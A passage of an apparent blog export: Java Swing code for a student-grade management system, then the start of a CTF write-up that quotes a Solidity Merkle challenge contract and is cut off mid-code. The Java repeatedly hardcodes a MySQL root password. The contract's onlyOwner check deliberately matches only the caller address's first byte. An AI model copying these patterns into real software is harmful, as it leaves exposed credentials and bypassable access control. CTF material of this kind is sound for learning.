JOptionPane.showConfirmDialog(this, &quot;是否生成成绩图表？&quot;, &quot;选择图表类型&quot;,</span><br><span class="line">                            JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);</span><br><span class="line"></span><br><span class="line">                    if (response == JOptionPane.YES_OPTION) &#123;</span><br><span class="line">                        // 选择图表类型</span><br><span class="line">                        String[] options = &#123;&quot;柱状图&quot;, &quot;折线图&quot;&#125;;</span><br><span class="line">                        int chartType = JOptionPane.showOptionDialog(this, &quot;请选择图表类型：&quot;,</span><br><span class="line">                                &quot;选择图表类型&quot;, JOptionPane.DEFAULT_OPTION, JOptionPane.INFORMATION_MESSAGE,</span><br><span class="line">                                null, options, options[0]);</span><br><span class="line"></span><br><span class="line">                        // 创建数据集</span><br><span class="line">                        DefaultCategoryDataset dataset = new DefaultCategoryDataset();</span><br><span class="line">                        dataset.addValue(rs.getDouble(&quot;avg_math&quot;), &quot;平均分&quot;, &quot;数学&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;max_math&quot;), &quot;最高分&quot;, &quot;数学&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;min_math&quot;), &quot;最低分&quot;, &quot;数学&quot;);</span><br><span class="line">                        dataset.addValue(rs.getDouble(&quot;avg_maYuan&quot;), &quot;平均分&quot;, &quot;马原&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;max_maYuan&quot;), &quot;最高分&quot;, &quot;马原&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;min_maYuan&quot;), &quot;最低分&quot;, &quot;马原&quot;);</span><br><span class="line">                        dataset.addValue(rs.getDouble(&quot;avg_english&quot;), &quot;平均分&quot;, &quot;英语&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;max_english&quot;), &quot;最高分&quot;, &quot;英语&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;min_english&quot;), &quot;最低分&quot;, &quot;英语&quot;);</span><br><span class="line">                        dataset.addValue(rs.getDouble(&quot;avg_linemath&quot;), &quot;平均分&quot;, &quot;线性代数&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;max_linemath&quot;), &quot;最高分&quot;, &quot;线性代数&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;min_linemath&quot;), &quot;最低分&quot;, &quot;线性代数&quot;);</span><br><span class="line"></span><br><span class="line">                        // 创建图表</span><br><span class="line">                        JFreeChart chart;</span><br><span class="line">                        if (chartType == 0) &#123; // 柱状图</span><br><span class="line">                            chart = ChartFactory.createBarChart(</span><br><span class="line">                                    &quot;成绩分析&quot;,</span><br><span class="line">                                    &quot;课程&quot;,</span><br><span class="line">                                    &quot;分数&quot;,</span><br><span class="line">                                    dataset,</span><br><span class="line">                                    PlotOrientation.VERTICAL,</span><br><span class="line">                                    true,</span><br><span class="line">                                    true,</span><br><span class="line">                                    false</span><br><span class="line">                            );</span><br><span class="line">                        &#125; else &#123; // 折线图</span><br><span class="line">                            chart = ChartFactory.createLineChart(</span><br><span class="line">                                    &quot;成绩分析&quot;,</span><br><span class="line">                                    &quot;课程&quot;,</span><br><span class="line">                                    &quot;分数&quot;,</span><br><span class="line">                                    dataset,</span><br><span class="line">                                    PlotOrientation.VERTICAL,</span><br><span class="line">                                    true,</span><br><span class="line">                                    true,</span><br><span class="line">                                    false</span><br><span class="line">                            );</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        // 显示图表</span><br><span class="line">                        ChartFrame frame = new ChartFrame(&quot;成绩分析图&quot;, chart);</span><br><span class="line">                        frame.pack();</span><br><span class="line">                        frame.setLocationRelativeTo(null);</span><br><span class="line">                        frame.setVisible(true);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//实现管理员的方法，默认语言就是中文，但是整体的公共的语言没有改变。</span><br><span class="line"></span><br><span class="line">         class AdminPanel extends JPanel &#123;</span><br><span class="line">            private String currentTheme = &quot;默认主题&quot;; // 默认主题</span><br><span class="line">            private String currentLanguage = &quot;中文&quot;; // 默认语言</span><br><span class="line">            private String currentDatabaseURL = &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;;</span><br><span class="line">            private String currentDatabaseUsername = &quot;root&quot;;</span><br><span class="line">            private String currentDatabasePassword = &quot;1405269390a&quot;;</span><br><span class="line">            public AdminPanel() &#123;</span><br><span class="line">                setLayout(new BorderLayout());</span><br><span class="line"></span><br><span class="line">                // 顶部标题</span><br><span class="line">                JPanel topPanel = new JPanel();</span><br><span class="line">                JLabel titleLabel = new JLabel(&quot;管理员控制面板&quot;, JLabel.CENTER);</span><br><span class="line">                titleLabel.setFont(new Font(&quot;Serif&quot;, Font.BOLD, 24));</span><br><span class="line">                topPanel.add(titleLabel);</span><br><span class="line">                add(topPanel, BorderLayout.NORTH);</span><br><span class="line"></span><br><span class="line">                // 功能按钮面板</span><br><span class="line">                JPanel buttonPanel = new JPanel(new GridLayout(3, 6, 5, 5));  // 3列布局</span><br><span class="line"></span><br><span class="line">                JButton btnUserManagement = createStyledButton(&quot;学生管理&quot;);</span><br><span class="line">                JButton btnSystemSettings = createStyledButton(&quot;系统设置&quot;);</span><br><span class="line">                JButton btnGenerateReport = createStyledButton(&quot;生成报表&quot;);</span><br><span class="line"></span><br><span class="line">                // 按钮事件绑定</span><br><span class="line">                btnUserManagement.addActionListener(e -&gt; manageUsers());</span><br><span class="line">                btnSystemSettings.addActionListener(e -&gt; systemSettings());</span><br><span class="line">                btnGenerateReport.addActionListener(e -&gt; generateReport());</span><br><span class="line"></span><br><span class="line">                // 添加按钮到按钮面板</span><br><span class="line">                buttonPanel.add(btnUserManagement);</span><br><span class="line">                buttonPanel.add(btnSystemSettings);</span><br><span class="line">                buttonPanel.add(btnGenerateReport);</span><br><span class="line"></span><br><span class="line">                add(buttonPanel, BorderLayout.CENTER);</span><br><span class="line"></span><br><span class="line">                // 底部版权信息</span><br><span class="line">                JPanel bottomPanel = new JPanel();</span><br><span class="line">                bottomPanel.setBackground(new Color(72, 61, 139));</span><br><span class="line">                JLabel bottomLabel = new JLabel(&quot;版权所有 © 2024 管理员系统&quot;, JLabel.CENTER);</span><br><span class="line">                bottomLabel.setForeground(Color.WHITE);</span><br><span class="line">                bottomPanel.add(bottomLabel);</span><br><span class="line">                add(bottomPanel, BorderLayout.SOUTH);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            private JButton createStyledButton(String text) &#123;</span><br><span class="line">                JButton button = new JButton(text);</span><br><span class="line">                button.setFont(new Font(&quot;Serif&quot;, Font.PLAIN, 18));  // 使用Arial字体，较大的字号</span><br><span class="line">                button.setFocusPainted(false);  // 不显示按钮的焦点框</span><br><span class="line">                button.setPreferredSize(new Dimension(10, 10)); // 设置按钮的大小</span><br><span class="line">                button.setForeground(Color.BLACK);  // 文字颜色为黑色</span><br><span class="line">                button.setBackground(Color.WHITE);  // 背景为白色</span><br><span class="line">                button.setBorder(BorderFactory.createLineBorder(Color.BLACK, 2)); // 边框颜色为黑色</span><br><span class="line">                button.setOpaque(false);  // 设置按钮背景透明</span><br><span class="line">                return button;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            private void manageUsers() &#123;</span><br><span class="line">        String[] options = &#123;&quot;添加学生&quot;, &quot;删除学生&quot;, &quot;查看学生&quot;&#125;;</span><br><span class="line">        int choice = JOptionPane.showOptionDialog(this, &quot;请选择操作:&quot;, &quot;学生管理&quot;,</span><br><span class="line">                JOptionPane.DEFAULT_OPTION, JOptionPane.INFORMATION_MESSAGE,</span><br><span class="line">                null, options, options[0]);</span><br><span class="line"></span><br><span class="line">        switch (choice) &#123;</span><br><span class="line">            case 0: // 添加用户</span><br><span class="line">                addUser();</span><br><span class="line">                break;</span><br><span class="line">            case 1: // 删除用户</span><br><span class="line">                deleteUser();</span><br><span class="line">                break;</span><br><span class="line">            case 2: // 查看用户</span><br><span class="line">                viewUsers();</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void addUser() &#123;</span><br><span class="line">        JTextField usernameField = new JTextField(15);</span><br><span class="line">        JTextField nameField = new JTextField(15);</span><br><span class="line">        JPanel panel = new JPanel(new GridLayout(0, 1));</span><br><span class="line">        panel.add(new JLabel(&quot;学生ID:&quot;));</span><br><span class="line">        panel.add(usernameField);</span><br><span class="line">        panel.add(new JLabel(&quot;姓名:&quot;));</span><br><span class="line">        panel.add(nameField);</span><br><span class="line"></span><br><span class="line">        int option = JOptionPane.showConfirmDialog(this, panel, &quot;添加学生&quot;, JOptionPane.OK_CANCEL_OPTION);</span><br><span class="line">        if (option == JOptionPane.OK_OPTION) &#123;</span><br><span class="line">            String username = usernameField.getText();</span><br><span class="line">            String name = nameField.getText();</span><br><span class="line">            saveUserToDatabase(username, name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void saveUserToDatabase(String username, String name) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                 PreparedStatement stmt = conn.prepareStatement(&quot;INSERT INTO student (stuid1, name) VALUES (?, ?)&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">                stmt.setString(1, username);</span><br><span class="line">                stmt.setString(2, name);</span><br><span class="line">                stmt.executeUpdate();</span><br><span class="line"></span><br><span class="line">                JOptionPane.showMessageDialog(this, &quot;学生 &quot; + name + &quot; 添加成功!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void deleteUser() &#123;</span><br><span class="line">        String username = JOptionPane.showInputDialog(this, &quot;请输入要删除的学生ID:&quot;);</span><br><span class="line">        if (username != null &amp;&amp; !username.trim().isEmpty()) &#123;</span><br><span class="line">            deleteUserFromDatabase(username);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void deleteUserFromDatabase(String studentId) &#123;</span><br><span class="line">        Connection conn = null;</span><br><span class="line">        PreparedStatement stmt1 = null, stmt2 = null, stmt3 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line"></span><br><span class="line">            // 创建数据库连接</span><br><span class="line">            conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line"></span><br><span class="line">            // 禁用自动提交，启用事务</span><br><span class="line">            conn.setAutoCommit(false);</span><br><span class="line"></span><br><span class="line">            // 删除学生成绩</span><br><span class="line">            String deleteGradesQuery = &quot;DELETE FROM studentgrade WHERE stuid2 = ?&quot;;</span><br><span class="line">            stmt1 = conn.prepareStatement(deleteGradesQuery);</span><br><span class="line">            stmt1.setString(1, studentId);</span><br><span class="line">            stmt1.executeUpdate();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            // 删除学生基本信息</span><br><span class="line">            String deleteStudentQuery = &quot;DELETE FROM student WHERE stuid1 = ?&quot;;</span><br><span class="line">            stmt3 = conn.prepareStatement(deleteStudentQuery);</span><br><span class="line">            stmt3.setString(1, studentId);</span><br><span class="line">            int rowsAffected = stmt3.executeUpdate();</span><br><span class="line"></span><br><span class="line">            // 如果成功删除学生信息，提交事务</span><br><span class="line">            if (rowsAffected &gt; 0) &#123;</span><br><span class="line">                conn.commit(); // 提交事务</span><br><span class="line">                JOptionPane.showMessageDialog(this, &quot;学生 &quot; + studentId + &quot; 的所有信息删除成功!&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 如果没有删除学生记录，回滚事务</span><br><span class="line">                conn.rollback();</span><br><span class="line">                JOptionPane.showMessageDialog(this, &quot;未找到学生 &quot; + studentId + &quot; 的信息。&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if (conn != null) &#123;</span><br><span class="line">                    conn.rollback(); // 出现异常时回滚事务</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (SQLException ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage(), &quot;错误&quot;, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                // 关闭数据库连接和Statement</span><br><span class="line">                if (stmt1 != null) stmt1.close();</span><br><span class="line">                if (stmt2 != null) stmt2.close();</span><br><span class="line">                if (stmt3 != null) stmt3.close();</span><br><span class="line">                if (conn != null) conn.close();</span><br><span class="line">            &#125; catch (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void viewUsers() &#123;</span><br><span class="line">        List&lt;String&gt; users = fetchUsersFromDatabase();</span><br><span class="line">        if (users.isEmpty()) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;没有用户记录&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(this, String.join(&quot;\n&quot;, users));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private List&lt;String&gt; fetchUsersFromDatabase() &#123;</span><br><span class="line">        List&lt;String&gt; users = new ArrayList&lt;&gt;();</span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                 Statement stmt = conn.createStatement();</span><br><span class="line">                 ResultSet rs = stmt.executeQuery(&quot;SELECT stuid1, name FROM student&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">                while (rs.next()) &#123;</span><br><span class="line">                    String studentId = rs.getString(&quot;stuid1&quot;);</span><br><span class="line">                    String name = rs.getString(&quot;name&quot;);</span><br><span class="line">                    users.add(&quot;ID: &quot; + studentId + &quot; | 姓名: &quot; + name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        return users;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void systemSettings() &#123;</span><br><span class="line">        String[] options = &#123;&quot;设置主题&quot;, &quot;设置语言&quot;, &quot;修改数据库连接&quot;, &quot;返回&quot;&#125;;</span><br><span class="line">        int choice = JOptionPane.showOptionDialog(this, &quot;选择操作&quot;, &quot;系统设置&quot;,</span><br><span class="line">                JOptionPane.DEFAULT_OPTION, JOptionPane.INFORMATION_MESSAGE,</span><br><span class="line">                null, options, options[0]);</span><br><span class="line"></span><br><span class="line">        switch (choice) &#123;</span><br><span class="line">            case 0:</span><br><span class="line">                setTheme();</span><br><span class="line">                break;</span><br><span class="line">            case 1:</span><br><span class="line">                setLanguage();</span><br><span class="line">                break;</span><br><span class="line">            case 2:</span><br><span class="line">                setDatabaseConnection(); // 新增数据库连接设置</span><br><span class="line">                break;</span><br><span class="line">            case 3:</span><br><span class="line">            default:</span><br><span class="line">                break; // 返回或关闭</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 设置主题</span><br><span class="line">    private void setTheme() &#123;</span><br><span class="line">        String[] themes = &#123;&quot;默认主题&quot;, &quot;暗黑主题&quot;, &quot;明亮主题&quot;&#125;;</span><br><span class="line">        String selectedTheme = (String) JOptionPane.showInputDialog(this, &quot;选择主题&quot;, &quot;设置主题&quot;,</span><br><span class="line">                JOptionPane.QUESTION_MESSAGE, null, themes, currentTheme);</span><br><span class="line">        if (selectedTheme != null) &#123;</span><br><span class="line">            currentTheme = selectedTheme;</span><br><span class="line">            applyTheme();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;主题已更改为: &quot; + currentTheme);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 应用主题</span><br><span class="line">    private void applyTheme() &#123;</span><br><span class="line">        switch (currentTheme) &#123;</span><br><span class="line">            case &quot;暗黑主题&quot;:</span><br><span class="line">                setBackground(Color.DARK_GRAY);</span><br><span class="line">                break;</span><br><span class="line">            case &quot;明亮主题&quot;:</span><br><span class="line">                setBackground(Color.LIGHT_GRAY);</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                setBackground(Color.WHITE);</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">        repaint(); // 更新界面</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //设置语言，要更新的是整体阿代码，但是这个并没有实现，有点差错</span><br><span class="line">    private void setLanguage() &#123;</span><br><span class="line">        String[] languages = &#123;&quot;中文&quot;, &quot;英文&quot;&#125;;</span><br><span class="line">        String selectedLanguage = (String) JOptionPane.showInputDialog(this, &quot;选择语言&quot;, &quot;设置语言&quot;,</span><br><span class="line">                JOptionPane.QUESTION_MESSAGE, null, languages, currentLanguage);</span><br><span class="line">        if (selectedLanguage != null) &#123;</span><br><span class="line">            currentLanguage = selectedLanguage;</span><br><span class="line"></span><br><span class="line">            // 根据语言设置字体</span><br><span class="line">            Font newFont;</span><br><span class="line">            if (currentLanguage.equals(&quot;英文&quot;)) &#123;</span><br><span class="line">                newFont = new Font(&quot;Arial&quot;, Font.PLAIN, 12);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                newFont = new Font(&quot;SimSun&quot;, Font.PLAIN, 18); // 使用中文字体</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 设置整个应用程序的字体</span><br><span class="line">            setComponentsFont(this, newFont);</span><br><span class="line"></span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;语言已更改为: &quot; + currentLanguage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">             private void setComponentsFont(Component component, Font font) &#123;</span><br><span class="line">                 if (component instanceof JLabel) &#123;</span><br><span class="line">                     ((JLabel) component).setFont(font);</span><br><span class="line">                 &#125; else if (component instanceof JTextField) &#123;</span><br><span class="line">                     ((JTextField) component).setFont(font);</span><br><span class="line">                 &#125; else if (component instanceof JTextArea) &#123;</span><br><span class="line">                     ((JTextArea) component).setFont(font);</span><br><span class="line">                 &#125; else if (component instanceof JTable) &#123;</span><br><span class="line">                     ((JTable) component).setFont(font);</span><br><span class="line">                 &#125; else if (component instanceof Container) &#123;</span><br><span class="line">                     Component[] subComponents = ((Container) component).getComponents();</span><br><span class="line">                     for (Component subComponent : subComponents) &#123;</span><br><span class="line">                         setComponentsFont(subComponent, font);</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">    // 修改数据库连接</span><br><span class="line">    private void setDatabaseConnection() &#123;</span><br><span class="line">        String url = JOptionPane.showInputDialog(this, &quot;输入数据库URL&quot;, currentDatabaseURL);</span><br><span class="line">        if (url != null &amp;&amp; !url.trim().isEmpty()) &#123;</span><br><span class="line">            currentDatabaseURL = url;</span><br><span class="line"></span><br><span class="line">            // 假设你还有用户名和密码需要设置</span><br><span class="line">            String username = JOptionPane.showInputDialog(this, &quot;输入数据库用户名&quot;, currentDatabaseUsername);</span><br><span class="line">            if (username != null) &#123;</span><br><span class="line">                currentDatabaseUsername = username;</span><br><span class="line"></span><br><span class="line">                String password = JOptionPane.showInputDialog(this, &quot;输入数据库密码&quot;, currentDatabasePassword);</span><br><span class="line">                if (password != null) &#123;</span><br><span class="line">                    currentDatabasePassword = password;</span><br><span class="line"></span><br><span class="line">                    // 这里可以添加连接数据库的代码</span><br><span class="line">                    // connectToDatabase(currentDatabaseURL, currentDatabaseUsername, currentDatabasePassword);</span><br><span class="line"></span><br><span class="line">                    JOptionPane.showMessageDialog(this, &quot;数据库连接已更改为:\n&quot; +</span><br><span class="line">                            &quot;URL: &quot; + currentDatabaseURL + &quot;\n&quot; +</span><br><span class="line">                            &quot;用户名: &quot; + currentDatabaseUsername);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void generateReport() &#123;</span><br><span class="line">        String reportType = JOptionPane.showInputDialog(this, &quot;请输入报表类型（例如：学生成绩, 学生列表）:&quot;);</span><br><span class="line">        if (reportType != null &amp;&amp; !reportType.trim().isEmpty()) &#123;</span><br><span class="line">            if (reportType.equalsIgnoreCase(&quot;学生成绩&quot;)) &#123;</span><br><span class="line">                generateGradeReport();</span><br><span class="line">            &#125; else if (reportType.equalsIgnoreCase(&quot;学生列表&quot;)) &#123;</span><br><span class="line">                generateUserReport();</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                JOptionPane.showMessageDialog(this, &quot;无效的报表类型!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void generateGradeReport() &#123;</span><br><span class="line">        String[] columnNames = &#123;&quot;学生ID&quot;, &quot;姓名&quot;, &quot;数学成绩&quot;, &quot;英语成绩&quot;, &quot;MaYuan成绩&quot;, &quot;linemath成绩&quot;&#125;;</span><br><span class="line">        DefaultTableModel model = new DefaultTableModel(columnNames, 0);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                 Statement stmt = conn.createStatement();</span><br><span class="line">                 ResultSet rs = stmt.executeQuery(&quot;SELECT stuid2, name, math, English, MaYuan, linemath FROM studentgrade&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">                while (rs.next()) &#123;</span><br><span class="line">                    String studentId = rs.getString(&quot;stuid2&quot;);</span><br><span class="line">                    String name = rs.getString(&quot;name&quot;);</span><br><span class="line">                    int mathScore = rs.getInt(&quot;math&quot;);</span><br><span class="line">                    int englishScore = rs.getInt(&quot;English&quot;);</span><br><span class="line">                    int maYuanScore = rs.getInt(&quot;MaYuan&quot;);</span><br><span class="line">                    int lineMathScore = rs.getInt(&quot;linemath&quot;);</span><br><span class="line">                    model.addRow(new Object[]&#123;studentId, name, mathScore, englishScore, maYuanScore, lineMathScore&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        JTable table = new JTable(model);</span><br><span class="line">        JScrollPane scrollPane = new JScrollPane(table);</span><br><span class="line">        JOptionPane.showMessageDialog(this, scrollPane, &quot;学生成绩报表&quot;, JOptionPane.INFORMATION_MESSAGE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void generateUserReport() &#123;</span><br><span class="line">        String[] columnNames = &#123;&quot;学生ID&quot;, &quot;姓名&quot;, &quot;电话&quot;, &quot;QQ邮箱&quot;, &quot;班级编号&quot;&#125;;</span><br><span class="line">        DefaultTableModel model = new DefaultTableModel(columnNames, 0);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                 Statement stmt = conn.createStatement();</span><br><span class="line">                 ResultSet rs = stmt.executeQuery(&quot;SELECT stuid1, name, telenumber, qqmail, classnumber FROM student&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">                while (rs.next()) &#123;</span><br><span class="line">                    String studentId = rs.getString(&quot;stuid1&quot;);</span><br><span class="line">                    String name = rs.getString(&quot;name&quot;);</span><br><span class="line">                    String telephone = rs.getString(&quot;telenumber&quot;);</span><br><span class="line">                    String qqMail = rs.getString(&quot;qqmail&quot;);</span><br><span class="line">                    String classNumber = rs.getString(&quot;classnumber&quot;);</span><br><span class="line">                    model.addRow(new Object[]&#123;studentId, name, telephone, qqMail, classNumber&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        JTable table = new JTable(model);</span><br><span class="line">        JScrollPane scrollPane = new JScrollPane(table);</span><br><span class="line">        JOptionPane.showMessageDialog(this, scrollPane, &quot;用户列表报表&quot;, JOptionPane.INFORMATION_MESSAGE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-OwnerBuy</title>
      <link href="/2024/11/30/CTF-OwnerBuy/"/>
      <url>/2024/11/30/CTF-OwnerBuy/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Merkle</title>
      <link href="/2024/11/30/CTF-Merkle/"/>
      <url>/2024/11/30/CTF-Merkle/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Merkle"><a href="#CTF-Merkle" class="headerlink" title="CTF-Merkle"></a>CTF-Merkle</h1><p>题目原代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">library MerkleProof &#123;</span><br><span class="line">   </span><br><span class="line">    function verify( bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) &#123;</span><br><span class="line">        return processProof(proof, leaf) == root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) &#123;</span><br><span class="line">        bytes32 computedHash = leaf;</span><br><span class="line">        for (uint256 i = 0; i &lt; proof.length; i++) &#123;</span><br><span class="line">            bytes32 proofElement = proof[i];</span><br><span class="line">            if (computedHash &lt;= proofElement) &#123;</span><br><span class="line">                // Hash(current computed hash + current element of the proof)</span><br><span class="line">                computedHash = keccak256(abi.encodePacked(computedHash, proofElement));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // Hash(current element of the proof + current computed hash)</span><br><span class="line">                computedHash = keccak256(abi.encodePacked(proofElement, computedHash));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return computedHash;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Merkle &#123;</span><br><span class="line">    </span><br><span class="line">    uint public amount = 1;</span><br><span class="line">    address public owner;</span><br><span class="line">    bytes20 mask = hex&quot;ff00000000000000000000000000000000000000&quot;;</span><br><span class="line">    bytes32 public merkleRoot;</span><br><span class="line">    </span><br><span class="line">    // 一开始合约有1ether</span><br><span class="line">    constructor(bytes32 root) payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        owner =  msg.sender;</span><br><span class="line">        merkleRoot = root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 只要调用者地址的第一个高字节和owner一样即可</span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(mask &amp; bytes20(msg.sender) == mask &amp; bytes20(owner));</span><br><span class="line">        _;</span><br><span class="line">    